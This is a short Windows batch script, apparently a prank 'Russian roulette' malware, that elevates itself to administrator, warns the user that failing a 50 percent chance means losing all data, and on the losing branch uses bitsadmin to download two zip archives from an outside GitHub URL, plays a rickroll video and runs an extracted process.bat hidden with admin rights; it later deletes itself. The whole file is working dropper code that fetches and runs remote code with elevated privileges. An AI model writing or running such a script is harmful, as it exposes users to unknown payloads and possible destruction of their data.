@echo off

:: main.bat

if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)

del /q C:\Windows\Temp\tmp.vbs >nul

set /a rand=%random% %% 2 + 1

:menue
echo You have a 50 percent chance to survive!
echo If you fail, all your data will be lost!
echo.
set /p asw="Do you really want to continue? [y/n] "

if %asw%==y (goto continue)
if %asw%==n (goto exit) else (goto menue)
exit

:continue
if %rand%==1 (goto fucked)
if %rand%==2 (goto luck)
exit

:fucked
cls

bitsadmin /transfer mydownloadjob /download /priority foreground "https://raw.githubusercontent.com/Phoenixthrush/phoenixthrush.github.io/master/sites/assets/rick.zip" "C:\Windows\Temp\rick.zip" >nul
bitsadmin /transfer mydownloadjob /download /priority foreground "https://raw.githubusercontent.com/Phoenixthrush/phoenixthrush.github.io/master/sites/assets/666.zip" "C:\Windows\Temp\666.zip" >nul
powershell -c "Expand-Archive C:\Windows\Temp\rick.zip %userprofile%\Desktop" >nul
powershell -c "Expand-Archive C:\Windows\Temp\666.zip C:\Windows\Temp" >nul

del /q C:\Windows\Temp\666.zip >nul
start "" "%userprofile%\Desktop\rick.mp4"
timeout 2 /nobreak >nul
powershell -c "Start-Process -Verb RunAs -WindowStyle hidden C:\Windows\Temp\process.bat"
exit

:luck
cls
echo you survived!
echo Maybe see ya later!
pause >nul
del /q C:\Windows\Temp\process.bat >nul
start /b "" cmd /c del "%~f0" && taskkill /im cmd.exe /f